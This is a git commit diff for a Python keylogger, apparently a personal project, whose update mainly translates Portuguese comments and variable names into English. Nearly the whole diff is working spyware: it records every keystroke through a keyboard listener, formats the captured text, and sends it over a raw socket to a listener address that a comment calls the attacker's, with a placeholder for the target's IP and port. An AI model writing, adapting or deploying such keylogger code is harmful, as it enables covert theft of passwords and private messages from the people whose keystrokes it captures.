12167ff124b3196b0ce059d406617239ccb288e6
Rodrigo Soares Ferreira <92071020+Atreus75@users.noreply.github.com>
2025-07-23 20:41:37 -0300

    Update keyllogger.py

--- Keyllogger/keyllogger.py
+++ Keyllogger/keyllogger.py
@@ -3,54 +3,51 @@ from threading import Thread
 import time
 import socket
 
-# ====================================================================================================
-# Comunica tudo o que é digitado para o listener
-
-
 s = socket.socket()
-# Insira o IP e a porta do listener abaixo
+# Insert target's IP and PORT below.
 s.connect(('127.0.0.1', 4444))
 
-# =====================================================================================================
-# Formata e organiza tudo o que é digitado
-digitado = ''
+# Formats the typed text.
+typed = ''
 
-def monitor(tecla):
-    global digitado
-    tecla = str(tecla)
-    # Formata a tecla caso seja uma letra ou número
-    if "'" in tecla:
-        tecla = tecla.replace("'", '')
+def monitor(key):
+    global typed
+    key = str(key)
+    # Formats numbers and text.
+    if "'" in key:
+        key = key.replace("'", '')
     
-    # Caso não seja uma letra ou número, formata a tecla especial com base em seu efeito no texto
+    # Formats special keys.
     else:
-        tecla = tecla.replace(tecla[:4], '')
-        tradutor = {'space':' ', '<96>':'0', '<97>':'1', '<98>':'2', '<99>':'3', '<100>':'4', '<101>':'5', '<102>':'6', '<103>':'7', '<104>':'8', '<105>':'9'}
-        if tecla in tradutor:
-            tecla = tradutor[tecla]
-        elif tecla == 'backspace':
-            digitado = digitado[:-1]
+        key = key.replace(key[:4], '')
+        translate = {'space':' ', '<96>':'0', '<97>':'1', '<98>':'2', '<99>':'3', '<100>':'4', '<101>':'5', '<102>':'6', '<103>':'7', '<104>':'8', '<105>':'9'}
+        if key in translate:
+            key = translate[key]
+        elif key == 'backspace':
+            typed = typed[:-1]
             return
         else:
             try:
-                tecla = f" [{tecla[0].upper()}{tecla[1:]}] "
+                key = f" [{key[0].upper()}{key[1:]}] "
             except:
-                tecla = ' [Algum do numpad] '
+                key = ' [some numpad key] '
 
-    # Adiciona a tecla formatada á lista caso a entrada seja [Enter]
-    digitado += tecla
+    # Adds the formated key if its [Enter]
+    typed += key
 
 
-# ======================================================================================================
-# Envia as informações capturadas para o atacante
+# Sends all the information to the attacker.
 while True:
     with Listener(on_press=monitor) as ls:
         def time_out(minutos: int):
-            time.sleep(60 * minutos)  # Listen to keyboard for period_sec seconds
+            # Listens to keyboard for period_sec seconds
+            time.sleep(60 * minutos)  
             ls.stop()
-            s.send(bytes(digitado, 'utf-8'))
+            s.send(bytes(typed, 'utf-8'))
+            s.close()
             
 
-        Thread(target=time_out, args=(0.1,)).start()
-        digitado = ''
+        Thread(target=time_out, args=(0.2,)).start()
+        typed = ''
         ls.join()
+        exit()
